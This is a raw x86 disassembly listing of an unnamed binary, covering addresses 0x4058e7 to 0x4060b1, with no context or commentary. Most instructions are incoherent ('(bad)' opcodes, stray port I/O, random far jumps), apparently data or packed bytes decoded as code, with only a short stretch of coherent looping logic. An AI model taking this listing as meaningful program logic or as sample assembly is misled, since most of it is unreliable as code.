  4058e7:	ins    DWORD PTR es:[edi],dx
  4058e8:	pop    edx
  4058e9:	xchg   DWORD PTR [ecx+0x79],ebp
  4058ec:	out    0xbf,eax
  4058ee:	out    0x5a,al
  4058f0:	mov    esi,0xedad0a29
  4058f5:	mov    edx,0x37b123cb
  4058fa:	mov    fs,WORD PTR [ebp+0x8f7eebd]
  405900:	inc    ebp
  405901:	in     eax,dx
  405902:	or     BYTE PTR [edx-0x49],cl
  405905:	(bad)  
  405906:	rol    BYTE PTR [ecx+eiz*4-0x38],1
  40590a:	adc    eax,edx
  40590c:	mov    WORD PTR [edx-0xc5ecf85],?
  405912:	call   0x24d06fc2
  405917:	ins    BYTE PTR es:[edi],dx
  405918:	sbb    al,0xdf
  40591a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40591b:	out    0xe5,eax
  40591d:	or     al,0x3f
  40591f:	add    eax,esi
  405921:	add    BYTE PTR [edx-0x43],dl
  405924:	sub    al,0x5
  405926:	ins    BYTE PTR es:[edi],dx
  405927:	add    esp,DWORD PTR [eax+0x50ba4c74]
  40592d:	mov    ebx,0x51981724
  405932:	dec    edi
  405933:	mov    edi,0xc77a37a1
  405938:	ins    DWORD PTR es:[edi],dx
  405939:	inc    eax
  40593a:	in     al,dx
  40593b:	pop    ebp
  40593c:	inc    edx
  40593d:	mov    ecx,eax
  40593f:	retf   0xbbee
  405942:	xor    BYTE PTR [edx],dh
  405944:	adc    DWORD PTR ds:0xa8fc3571,edi
  40594a:	test   eax,0x8241df50
  40594f:	loope  0x40593f
  405951:	pusha  
  405952:	clc    
  405953:	in     al,0xa1
  405955:	mov    DWORD PTR [ebp-0x8],0x4f39
  40595c:	mov    DWORD PTR ds:0x434753,0x224a
  405966:	jmp    0x405cc9
  40596b:	mov    edx,0x71b8a1ab
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	fucomip st,st(2)
  405979:	clc    
  40597a:	pop    ebp
  40597b:	out    dx,eax
  40597c:	xor    DWORD PTR [esi+0x7e],edi
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x405991
  405984:	mov    dh,0x7
  405986:	xchg   DWORD PTR [ebx-0x70],edi
  405989:	arpl   WORD PTR [ebp-0xa],di
  40598c:	adc    DWORD PTR [esi],edi
  40598e:	stc    
  40598f:	push   0x11129eb
  405994:	clc    
  405995:	(bad)  
  405996:	bound  esi,QWORD PTR [edi+eiz*1-0x5ea1d48a]
  40599d:	cmp    BYTE PTR [esi+0x49b9f862],al
  4059a3:	dec    ebx
  4059a4:	ret    0x81ac
  4059a7:	pop    ds
  4059a8:	xlat   BYTE PTR ds:[ebx]
  4059a9:	mov    bh,BYTE PTR [edx]
  4059ab:	loope  0x405984
  4059ad:	xchg   BYTE PTR [edi+0xd],ah
  4059b0:	fbstp  TBYTE PTR [eax+esi*4+0x5a]
  4059b4:	sub    DWORD PTR [ecx*1+0x774659c9],0x81cdc3d9
  4059bf:	cdq    
  4059c0:	cwde   
  4059c1:	fcom   st(2)
  4059c3:	aaa    
  4059c4:	out    dx,eax
  4059c5:	xchg   ebp,eax
  4059c6:	mov    edx,0xe0bcfa8c
  4059cb:	(bad)  
  4059cc:	mov    ebx,0xff39df80
  4059d1:	and    ah,dl
  4059d3:	fst    DWORD PTR cs:[edi-0x4b]
  4059d7:	jmp    0x6948:0x2209a6ea
  4059de:	dec    esp
  4059df:	mov    ecx,0xa3daf7d3
  4059e4:	scas   al,BYTE PTR es:[edi]
  4059e5:	clc    
  4059e6:	mov    ecx,0xd6ab5cc8
  4059eb:	pusha  
  4059ec:	js     0x405991
  4059ee:	or     BYTE PTR [ecx-0x6a],dl
  4059f1:	jl     0x4059fc
  4059f3:	pop    ss
  4059f4:	pop    es
  4059f5:	push   cs
  4059f6:	jns    0x405a47
  4059f8:	rcr    DWORD PTR [ebp-0x61],1
  4059fb:	jp     0x405984
  4059fd:	cwde   
  4059fe:	or     eax,ebp
  405a00:	loopne 0x4059eb
  405a02:	jne    0x405986
  405a04:	adc    edx,DWORD PTR [ecx-0x76]
  405a07:	inc    eax
  405a08:	repnz popa 
  405a0a:	(bad)  
  405a0b:	fcom   st(3)
  405a0d:	xchg   edi,eax
  405a0e:	adc    esp,DWORD PTR [ebp-0x3c]
  405a11:	cmp    DWORD PTR [esi+0x68884cda],esp
  405a17:	xor    dl,BYTE PTR [esi+0x3cecd287]
  405a1d:	mov    ah,0xb4
  405a1f:	scas   eax,DWORD PTR es:[edi]
  405a20:	test   BYTE PTR [eax-0x7a],0x1d
  405a24:	aas    
  405a25:	or     dh,BYTE PTR [esi]
  405a27:	mov    bh,0x70
  405a29:	xchg   edi,eax
  405a2a:	mov    bh,0x9c
  405a2c:	pop    edx
  405a2d:	jp     0x405a23
  405a2f:	jmp    0x3a1e:0xc83990d9
  405a36:	neg    BYTE PTR [edi]
  405a38:	mov    bh,0xd9
  405a3a:	add    ecx,edx
  405a3c:	aaa    
  405a3d:	int    0x5a
  405a3f:	jmp    0x7c88:0xe61481dd
  405a46:	xchg   edx,eax
  405a47:	inc    esp
  405a48:	mov    ebx,esp
  405a4a:	push   0x5c9cfba
  405a4f:	mov    edx,0xa76543ac
  405a54:	out    0xae,al
  405a56:	cmp    DWORD PTR [ecx],edx
  405a58:	ins    BYTE PTR es:[edi],dx
  405a59:	sub    eax,0x9fb3df2a
  405a5e:	test   al,0xa7
  405a60:	jbe    0x405acb
  405a62:	int3   
  405a63:	cwde   
  405a64:	aam    0xf6
  405a66:	dec    eax
  405a67:	icebp  
  405a68:	sub    BYTE PTR [esi+edx*8],0x55
  405a6c:	xor    BYTE PTR [edi-0x44ee5b92],bl
  405a72:	ret    0x91a3
  405a75:	cmp    al,0x2d
  405a77:	bound  edi,QWORD PTR [edx+0x1c]
  405a7a:	pushf  
  405a7b:	inc    edx
  405a7c:	and    al,0x77
  405a7e:	ror    BYTE PTR [ebx],0xdf
  405a81:	xchg   ebp,eax
  405a82:	repnz popf 
  405a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a85:	dec    esp
  405a86:	adc    BYTE PTR [ebx-0x68],ch
  405a89:	xor    ecx,esi
  405a8b:	jnp    0x405a3b
  405a8d:	mov    eax,0x31afba76
  405a92:	push   edx
  405a93:	ja     0x405a5f
  405a95:	mov    ds:0x72e6cafa,eax
  405a9a:	aam    0x12
  405a9c:	das    
  405a9d:	dec    ebx
  405a9e:	imul   eax,DWORD PTR [esi],0xbdda0f2d
  405aa4:	and    dh,0xbf
  405aa7:	ret    
  405aa8:	stc    
  405aa9:	fwait
  405aaa:	push   ebp
  405aab:	in     al,0xa
  405aad:	fldenv [ecx]
  405aaf:	mov    esi,eax
  405ab1:	add    BYTE PTR [edi-0x22640c0a],dl
  405ab7:	sub    al,0x32
  405ab9:	popf   
  405aba:	inc    edi
  405abb:	add    al,0xcf
  405abd:	pop    ds
  405abe:	cmc    
  405abf:	fs mov ch,0x6a
  405ac2:	out    0xd7,eax
  405ac4:	js     0x405a91
  405ac6:	jmp    FWORD PTR [ebx-0x7c]
  405ac9:	push   esp
  405aca:	out    0x72,eax
  405acc:	sub    BYTE PTR [ecx+0x48],bl
  405acf:	fstp   DWORD PTR [ebx-0x5b]
  405ad2:	leave  
  405ad3:	mov    eax,0x84958474
  405ad8:	stos   BYTE PTR es:[edi],al
  405ad9:	(bad)  
  405ada:	imul   DWORD PTR fs:[edi-0xbec97c8]
  405ae1:	inc    esi
  405ae2:	test   ah,dl
  405ae4:	pop    edi
  405ae5:	sbb    eax,0x69fff6a1
  405aea:	dec    ebp
  405aeb:	jo     0x405b2e
  405aed:	test   DWORD PTR [eax-0x244b8c8c],edi
  405af3:	aaa    
  405af4:	xor    al,ah
  405af6:	pop    ebx
  405af7:	xchg   esi,eax
  405af8:	and    al,0x8f
  405afa:	mov    ecx,0xc5e14146
  405aff:	lods   al,BYTE PTR ds:[esi]
  405b00:	inc    eax
  405b01:	popf   
  405b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b03:	xor    al,0xcf
  405b05:	lea    edi,[ebx-0x4c]
  405b08:	fdivr  st(0),st
  405b0a:	test   al,0xe1
  405b0c:	mov    ecx,0x500a073b
  405b11:	push   cs
  405b12:	add    dl,BYTE PTR [edi]
  405b14:	out    dx,al
  405b15:	std    
  405b16:	shl    DWORD PTR [ecx+0x38341fb],cl
  405b1c:	out    dx,eax
  405b1d:	jmp    0x22078d7e
  405b22:	sti    
  405b23:	fs test bh,cl
  405b26:	jb     0x405b78
  405b28:	(bad)  
  405b29:	nop
  405b2a:	data16 shr BYTE PTR [ebx+0x39],cl
  405b2e:	mov    al,0x8a
  405b30:	sub    DWORD PTR [edi],ecx
  405b32:	fadd   st(0),st
  405b34:	mov    esp,0x68fcab40
  405b39:	pop    ebp
  405b3a:	inc    eax
  405b3b:	sbb    ebx,DWORD PTR [edi-0x24]
  405b3e:	mov    bh,0x9c
  405b40:	pop    ds
  405b41:	dec    ebx
  405b42:	rep ins DWORD PTR es:[edi],dx
  405b44:	xor    al,0x11
  405b46:	inc    DWORD PTR [ebp+ebp*1-0x576cc019]
  405b4d:	xlat   BYTE PTR ds:[ebx]
  405b4e:	mov    gs,esp
  405b50:	dec    eax
  405b51:	push   0xf0ffb760
  405b56:	add    DWORD PTR [esi],ebx
  405b58:	hlt    
  405b59:	sbb    dl,BYTE PTR [edi-0x20]
  405b5c:	int    0xcd
  405b5e:	(bad)  
  405b5f:	jmp    0x405afd
  405b61:	je     0x405bb4
  405b63:	(bad)  
  405b64:	sti    
  405b65:	mov    ebp,0x810aef97
  405b6a:	cmp    ah,BYTE PTR [edx-0x3f]
  405b6d:	xor    ch,dh
  405b6f:	push   esp
  405b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b71:	inc    edi
  405b72:	in     al,dx
  405b73:	sbb    ebx,DWORD PTR ds:0x5b9a5e29
  405b79:	xor    esi,DWORD PTR [ebx]
  405b7b:	dec    ebp
  405b7c:	inc    bx
  405b7e:	add    BYTE PTR [ecx-0x3f],bl
  405b81:	sub    DWORD PTR [esp+edi*4],ebp
  405b84:	sahf   
  405b85:	xchg   ebp,eax
  405b86:	push   edi
  405b87:	cmp    dh,BYTE PTR [ebx]
  405b89:	or     eax,0xdcbe0569
  405b8e:	into   
  405b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b90:	stc    
  405b91:	mov    edx,0xf4796e14
  405b96:	stos   BYTE PTR es:[edi],al
  405b97:	jb     0x405b64
  405b99:	outs   dx,DWORD PTR ds:[esi]
  405b9a:	adc    al,0x3e
  405b9c:	jmp    0xd068c39
  405ba1:	xchg   edx,eax
  405ba2:	stos   DWORD PTR es:[edi],eax
  405ba3:	sti    
  405ba4:	(bad)  
  405ba5:	push   0x1b
  405ba7:	sub    DWORD PTR [ecx-0x50],0xd651e2d8
  405bae:	pusha  
  405baf:	jb     0x405b6e
  405bb1:	jp     0x405b9e
  405bb3:	xchg   al,dl
  405bb5:	inc    esp
  405bb6:	sbb    eax,0x93773918
  405bbb:	in     al,0x26
  405bbd:	push   ecx
  405bbe:	or     esi,ebx
  405bc0:	data16 xlat BYTE PTR ds:[ebx]
  405bc2:	call   0x7a62f55d
  405bc7:	je     0x405c34
  405bc9:	cmp    dl,BYTE PTR [ebx+0x4f230aad]
  405bcf:	sbb    bh,BYTE PTR [eax-0x1f]
  405bd2:	leave  
  405bd3:	(bad)  
  405bd4:	dec    esi
  405bd5:	rcr    DWORD PTR [ebx+0x7a],1
  405bd8:	cmp    dh,bh
  405bda:	push   edi
  405bdb:	pop    DWORD PTR gs:[ebx]
  405bde:	xchg   ecx,eax
  405bdf:	or     ebp,DWORD PTR [eax+0x49280cee]
  405be5:	stos   BYTE PTR es:[edi],al
  405be6:	xchg   ecx,eax
  405be7:	xchg   ebp,eax
  405be8:	push   0x69
  405bea:	xor    ebp,DWORD PTR [eax]
  405bec:	inc    ebp
  405bed:	(bad)  [esi]
  405bef:	push   edi
  405bf0:	repnz xchg esp,ebx
  405bf3:	xor    ecx,ebx
  405bf5:	jl     0x405b79
  405bf7:	xor    al,0x30
  405bf9:	pop    es
  405bfa:	xor    BYTE PTR [esi],bh
  405bfc:	pop    eax
  405bfd:	push   eax
  405bfe:	ja     0x405c2e
  405c00:	mov    al,ds:0x36415315
  405c05:	loopne 0x405c3b
  405c07:	mov    edi,0x876fdcbd
  405c0c:	cmp    BYTE PTR [ebx-0x1b73b6eb],bl
  405c12:	push   cs
  405c13:	xor    BYTE PTR ds:0x3dd88b61,bh
  405c19:	mov    ds,WORD PTR [eax-0x25]
  405c1c:	or     ch,BYTE PTR [edi+eax*8+0x4a8a7459]
  405c23:	xchg   ebp,eax
  405c24:	mov    esi,0xe6597881
  405c29:	loop   0x405c31
  405c2b:	push   esi
  405c2c:	aam    0x83
  405c2e:	xor    BYTE PTR [ebx-0x1592e289],dh
  405c34:	cmp    al,0xb5
  405c36:	pop    ebx
  405c37:	pushf  
  405c38:	stc    
  405c39:	inc    edx
  405c3a:	imul   ecx,DWORD PTR [ebx-0x35],0x36
  405c3e:	retf   
  405c3f:	dec    esp
  405c40:	inc    edx
  405c41:	adc    esp,edi
  405c43:	mov    gs,WORD PTR [esi+0xf089d00]
  405c49:	stc    
  405c4a:	mov    ch,0x58
  405c4c:	jb     0x405cc4
  405c4e:	and    eax,esi
  405c50:	lahf   
  405c51:	sbb    dh,dh
  405c53:	mov    ds:0xa049f074,eax
  405c58:	into   
  405c59:	ror    BYTE PTR [ebx-0x4ec8622f],cl
  405c5f:	jbe    0x405c5f
  405c61:	aam    0xac
  405c63:	test   edi,esp
  405c65:	sbb    DWORD PTR [edx+0x67e3ca40],0xa5687310
  405c6f:	inc    ebx
  405c70:	fcom   st(1)
  405c72:	push   edx
  405c73:	adc    ebp,DWORD PTR ds:0xd2c12799
  405c79:	push   cs
  405c7a:	aad    0xd4
  405c7c:	fsub   st(2),st
  405c7e:	jl     0x405c82
  405c80:	dec    edx
  405c81:	xchg   edi,eax
  405c82:	pusha  
  405c83:	cwde   
  405c84:	cdq    
  405c85:	sbb    bl,BYTE PTR [esi]
  405c87:	das    
  405c88:	jbe    0x405ca0
  405c8a:	into   
  405c8b:	sub    esp,edx
  405c8d:	arpl   WORD PTR [edx],di
  405c8f:	pusha  
  405c90:	mov    dl,0x84
  405c92:	xor    DWORD PTR [ecx],eax
  405c94:	pop    es
  405c95:	ss mov bl,0xa6
  405c98:	sar    DWORD PTR [eax+0x68],1
  405c9b:	jbe    0x405c9d
  405c9d:	lahf   
  405c9e:	out    dx,eax
  405c9f:	in     al,dx
  405ca0:	call   0xb104ecb3
  405ca5:	jo     0x405ca9
  405ca7:	loopne 0x405c7e
  405ca9:	sub    BYTE PTR [esi],ch
  405cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cac:	xchg   esi,eax
  405cad:	mov    ds:0xee41bbf6,al
  405cb2:	or     cl,BYTE PTR [ebp-0x13133200]
  405cb8:	xchg   ebx,eax
  405cb9:	push   ebx
  405cba:	call   0x511e:0x685d1294
  405cc1:	call   0xe93f8417
  405cc6:	in     al,0xb5
  405cc8:	and    DWORD PTR [ebx],edi
  405cca:	enter  0x850f,0x12
  405cce:	add    al,0x0
  405cd0:	add    BYTE PTR [ecx],al
  405cd2:	adc    eax,0x4346bf
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x4346d3,0x4346fb
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43478f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x434747,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x4346c7,0x12
  405d19:	cmp    DWORD PTR ds:0x4346c7,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x4346c7,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x4346c7
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x4346c7,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0x75941bd6
  405d8d:	sub    al,0x68
  405d8f:	mov    ch,0x3c
  405d91:	jle    0x405e11
  405d93:	les    edi,FWORD PTR [ecx+0x7e]
  405d96:	jle    0x405dd2
  405d98:	outs   dx,BYTE PTR ds:[esi]
  405d99:	repz and eax,DWORD PTR [edi]
  405d9c:	pop    esp
  405d9d:	pop    DWORD PTR [esi+0x1]
  405da0:	jbe    0x405dcc
  405da2:	xor    BYTE PTR [ebx+0x30],dh
  405da5:	enter  0x6b6a,0x5b
  405da9:	test   eax,0x7bb8402c
  405dae:	xchg   esp,eax
  405daf:	xor    BYTE PTR [ebp-0x1f7e3a07],0x24
  405db6:	dec    edx
  405db7:	jge    0x405d7d
  405db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dba:	idiv   BYTE PTR [esi-0x5e435e5f]
  405dc0:	mov    ch,0x1f
  405dc2:	mov    WORD PTR [eax],es
  405dc4:	sub    BYTE PTR [eax],0x80
  405dc7:	push   ds
  405dc8:	in     al,0x4e
  405dca:	ds mov al,0x83
  405dcd:	popa   
  405dce:	mov    cl,0x64
  405dd0:	push   esp
  405dd1:	inc    BYTE PTR ds:0x36df3eb4
  405dd7:	out    dx,al
  405dd8:	cs xchg esp,eax
  405dda:	sub    al,BYTE PTR [esi+0x3f1e4778]
  405de0:	adc    DWORD PTR [ecx+0x6e1e7877],esi
  405de6:	mov    ebp,0xfc04b11b
  405deb:	fcmovbe st,st(2)
  405ded:	pop    es
  405dee:	dec    ebp
  405def:	mov    ds:0x89183f5b,al
  405df4:	out    0x60,al
  405df6:	frstor [esi-0x1a356ae]
  405dfc:	add    edi,DWORD PTR [edi-0x48]
  405dff:	lea    edi,[esi-0x40]
  405e02:	push   ss
  405e03:	aas    
  405e04:	mov    al,ds:0xf52088f8
  405e09:	add    al,0x8d
  405e0b:	repnz and eax,DWORD PTR [edx-0x47]
  405e0f:	sbb    bl,BYTE PTR [ecx+edi*4+0x69]
  405e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e14:	pop    eax
  405e15:	pop    es
  405e16:	xor    al,0x51
  405e18:	jnp    0x405e77
  405e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e1b:	outs   dx,DWORD PTR ds:[esi]
  405e1c:	sahf   
  405e1d:	pop    esp
  405e1e:	lods   al,BYTE PTR ds:[esi]
  405e1f:	inc    edi
  405e20:	iret   
  405e21:	sub    eax,0xdb30ce9c
  405e26:	or     DWORD PTR [edi+0x1f],ebx
  405e29:	lock lods al,BYTE PTR ds:[esi]
  405e2b:	xor    ch,BYTE PTR [esi-0x2fa744d4]
  405e31:	or     BYTE PTR [esi],al
  405e33:	fwait
  405e34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e35:	call   0xeea5a45b
  405e3a:	add    eax,0x44
  405e3d:	pop    edi
  405e3e:	adc    BYTE PTR [ecx],0x65
  405e41:	adc    eax,0x9eaa3df6
  405e46:	in     al,dx
  405e47:	jo     0x405e6d
  405e49:	scas   eax,DWORD PTR es:[edi]
  405e4a:	cmp    eax,0x6b77a4f1
  405e4f:	adc    eax,0x6136eaea
  405e54:	js     0x405ed5
  405e56:	mov    WORD PTR [esi-0x158e6be6],?
  405e5c:	or     DWORD PTR [ecx-0x6f],esp
  405e5f:	loop   0x405e62
  405e61:	dec    ecx
  405e62:	nop
  405e63:	and    dh,dl
  405e65:	mov    dl,0xbb
  405e67:	and    eax,0xce100f2
  405e6c:	lds    eax,FWORD PTR [ebp+0x11]
  405e6f:	push   esp
  405e70:	inc    esi
  405e71:	push   0xffffffc6
  405e73:	sbb    edi,edi
  405e75:	push   ebp
  405e76:	mov    cl,BYTE PTR [eax+0x31]
  405e79:	pop    edi
  405e7a:	mov    edi,0xe0c01ce0
  405e7f:	popf   
  405e80:	xchg   eax,esp
  405e82:	jne    0x405e33
  405e84:	fs sbb cl,0x6a
  405e88:	mov    bh,0x73
  405e8a:	jmp    0x405e26
  405e8c:	jmp    0x405edb
  405e8e:	inc    ebp
  405e8f:	push   ecx
  405e90:	aaa    
  405e91:	pusha  
  405e92:	mov    edi,DWORD PTR [ebp-0x4ab3cc6b]
  405e98:	jl     0x405ee7
  405e9a:	and    esi,DWORD PTR [esi-0x27]
  405e9d:	in     al,0x53
  405e9f:	sar    BYTE PTR [eax-0x2f],0xa3
  405ea3:	mov    eax,ds:0x850f29ad
  405ea8:	xor    esp,ebp
  405eaa:	into   
  405eab:	xor    cl,BYTE PTR [ecx-0x12]
  405eae:	pop    esi
  405eaf:	mov    ebp,0x801be561
  405eb4:	mov    edx,0x805cfb86
  405eb9:	iret   
  405eba:	adc    bl,BYTE PTR [ecx-0x5ac07b3a]
  405ec0:	mov    dh,ah
  405ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ec3:	fnstsw WORD PTR [esi+ebx*8]
  405ec6:	cmp    al,dh
  405ec8:	add    DWORD PTR [edi],eax
  405eca:	mov    ebp,0x46695aae
  405ecf:	mov    ds:0x252f286e,al
  405ed4:	in     al,dx
  405ed5:	pop    es
  405ed6:	jb     0x405f29
  405ed8:	fmul   QWORD PTR [ebx-0x8]
  405edb:	mov    ecx,0xb19412c4
  405ee0:	xchg   edx,eax
  405ee1:	mov    ch,0x78
  405ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ee4:	and    eax,0xcf15ccc5
  405ee9:	sbb    al,0x42
  405eeb:	leave  
  405eec:	outs   dx,BYTE PTR ds:[esi]
  405eed:	aam    0xd2
  405eef:	xchg   ebp,eax
  405ef0:	daa    
  405ef1:	fs cdq 
  405ef3:	sbb    ebx,ebp
  405ef5:	inc    esp
  405ef6:	jmp    0x405f11
  405ef8:	clc    
  405ef9:	xor    al,0x48
  405efb:	fldenv [ebx]
  405efd:	mov    fs,eax
  405eff:	fcomp  QWORD PTR [ecx+0x17]
  405f02:	mov    esi,0xc3bb273f
  405f07:	cmp    dl,BYTE PTR [ecx-0xf]
  405f0a:	stos   DWORD PTR es:[edi],eax
  405f0b:	adc    al,0x22
  405f0d:	mov    ecx,0xd0c2a44a
  405f12:	fldenv [ebx+0x2e]
  405f15:	xchg   edx,eax
  405f16:	xor    ecx,DWORD PTR [ebp-0x42]
  405f19:	(bad)  
  405f1a:	adc    eax,0x249834db
  405f1f:	add    ah,0x15
  405f22:	adc    eax,0x3bfc4366
  405f27:	int3   
  405f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f29:	arpl   WORD PTR [ecx],sp
  405f2b:	test   dl,ch
  405f2d:	jl     0x405eb3
  405f2f:	and    eax,0xfd74c29
  405f34:	(bad)  
  405f36:	xchg   ebp,eax
  405f37:	js     0x405ee2
  405f39:	mov    ds:0xd7cdb130,eax
  405f3e:	gs pop esp
  405f40:	(bad)  
  405f42:	add    eax,0x220670c6
  405f47:	scas   al,BYTE PTR es:[edi]
  405f48:	or     eax,0x62fd383f
  405f4d:	xor    esp,DWORD PTR [ecx]
  405f4f:	and    DWORD PTR [ebx-0x3],esp
  405f52:	or     eax,DWORD PTR [edx]
  405f54:	clc    
  405f55:	push   eax
  405f56:	push   edi
  405f57:	sub    BYTE PTR [ecx-0x73],bl
  405f5a:	cli    
  405f5b:	fidivr WORD PTR [ebx]
  405f5d:	nop
  405f5e:	inc    esi
  405f5f:	jmp    DWORD PTR [esi+0x5e]
  405f62:	inc    ebx
  405f63:	mov    fs,ebx
  405f65:	lods   al,BYTE PTR ds:[esi]
  405f66:	sub    DWORD PTR [eax-0x316f4b90],0x6800ae48
  405f70:	push   ss
  405f71:	sti    
  405f72:	mov    ebp,0x7dbbd429
  405f77:	push   esp
  405f78:	xor    BYTE PTR [edi],bl
  405f7a:	bound  ecx,QWORD PTR [esi]
  405f7c:	or     ebx,esi
  405f7e:	ja     0x405f19
  405f80:	dec    edi
  405f81:	or     eax,0xe2ad91d2
  405f86:	push   ds
  405f87:	pop    esi
  405f88:	cmp    eax,0x7a32e14f
  405f8d:	fisubr DWORD PTR [edx]
  405f8f:	or     ah,BYTE PTR [ecx]
  405f91:	mov    ebp,ebx
  405f93:	inc    edx
  405f94:	imul   eax,DWORD PTR [edx],0xffffffbb
  405f97:	int3   
  405f98:	call   0x25eb1551
  405f9d:	test   DWORD PTR [ebx+0x6b59a483],0xe577df0
  405fa7:	repz pop ss
  405fa9:	jp     0x405ff6
  405fab:	ret    0x850d
  405fae:	je     0x40600a
  405fb0:	mov    fs,WORD PTR [esi-0x405c61a1]
  405fb6:	xor    eax,0xa5a30f96
  405fbb:	retf   
  405fbc:	push   esp
  405fbd:	cmp    dl,BYTE PTR [ebx+0x42]
  405fc0:	push   DWORD PTR [edi-0x36]
  405fc3:	or     BYTE PTR [edi*4+0x7ab6bbbc],al
  405fca:	pusha  
  405fcb:	pop    ebx
  405fcc:	dec    ebx
  405fce:	or     BYTE PTR [ecx-0x2f],dh
  405fd1:	jns    0x405fd3
  405fd3:	(bad)  
  405fd4:	outs   dx,BYTE PTR ds:[esi]
  405fd6:	data16 jns 0x406008
  405fd9:	pop    ds
  405fda:	clc    
  405fdb:	pop    ds
  405fdc:	pop    es
  405fdd:	scas   al,BYTE PTR es:[edi]
  405fde:	(bad)  
  405fdf:	nop
  405fe0:	jecxz  0x405fdf
  405fe2:	xor    ebx,DWORD PTR ds:0xd6ce9432
  405fe8:	imul   edi,DWORD PTR [edi],0x60f342be
  405fee:	dec    eax
  405fef:	push   0x13dac30c
  405ff4:	ins    DWORD PTR es:[edi],dx
  405ff5:	stos   DWORD PTR es:[edi],eax
  405ff6:	sbb    esp,DWORD PTR [edx]
  405ff8:	cli    
  405ff9:	adc    dh,BYTE PTR [esi+0x5b]
  405ffc:	cdq    
  405ffd:	push   ds
  405ffe:	leave  
  405fff:	lock enter 0x65de,0x24
  406004:	pop    esp
  406005:	int3   
  406006:	ret    0x4e86
  406009:	js     0x406059
  40600b:	push   esp
  40600c:	nop
  40600d:	push   ds
  40600e:	call   0x8eca:0xe8cdc70f
  406015:	clc    
  406016:	sbb    ecx,ecx
  406018:	imul   edi,DWORD PTR [ebp+0x2abdd46f],0x41
  40601f:	push   cs
  406020:	xchg   ebx,eax
  406021:	scas   al,BYTE PTR es:[edi]
  406022:	push   ebp
  406023:	jno    0x40607e
  406025:	lods   al,BYTE PTR ds:[esi]
  406026:	pop    edi
  406027:	sahf   
  406028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40602a:	popf   
  40602b:	add    bh,BYTE PTR [edi+eiz*1]
  40602e:	(bad)  
  40602f:	stc    
  406030:	fwait
  406031:	add    ch,BYTE PTR [edx]
  406033:	adc    eax,0x97b81a0c
  406038:	pop    esi
  406039:	std    
  40603a:	aam    0xa6
  40603c:	ret    0xa57a
  40603f:	or     eax,0x1d4c28e1
  406044:	mov    ah,0x1e
  406046:	out    dx,al
  406047:	imul   eax,ebx,0xaa501c35
  40604d:	das    
  40604e:	jp     0x406068
  406050:	mov    ch,0xda
  406052:	inc    esp
  406053:	cvtdq2ps xmm0,xmm2
  406056:	rol    DWORD PTR ds:0xf45622fd,0x58
  40605d:	mov    ch,0x85
  40605f:	or     ebp,DWORD PTR [edi+ebx*1-0x68]
  406063:	mov    ebx,DWORD PTR [esi+0x53]
  406066:	jno    0x406010
  406068:	call   0x339b:0x6deab995
  40606f:	test   al,0x9c
  406071:	(bad)  
  406073:	mov    bl,0x7d
  406075:	sub    esi,eax
  406077:	sub    al,0x2e
  406079:	push   esi
  40607a:	xchg   esi,eax
  40607b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40607c:	sub    dl,BYTE PTR [bp+si-0x4fe9]
  406081:	xchg   edx,eax
  406082:	aas    
  406083:	cs mov al,0x44
  406086:	mov    ecx,0x97edd1b1
  40608b:	leave  
  40608c:	jae    0x406077
  40608e:	ins    DWORD PTR es:[edi],dx
  40608f:	xchg   edx,eax
  406090:	test   BYTE PTR [esi],ah
  406092:	mov    edx,0xc962d3a2
  406097:	or     eax,0xe92d5b51
  40609c:	jo     0x4060bf
  40609e:	pop    ebp
  40609f:	push   eax
  4060a0:	xchg   ebx,eax
  4060a1:	jecxz  0x406117
  4060a3:	xchg   ebp,eax
  4060a4:	mov    ebp,0x76cf4371
  4060a9:	add    ecx,esi
  4060ab:	ret    0xce41
  4060ae:	aas    
  4060af:	js     0x4060c6
  4060b1:	lea    esi,[eax+0x2baff7b2]
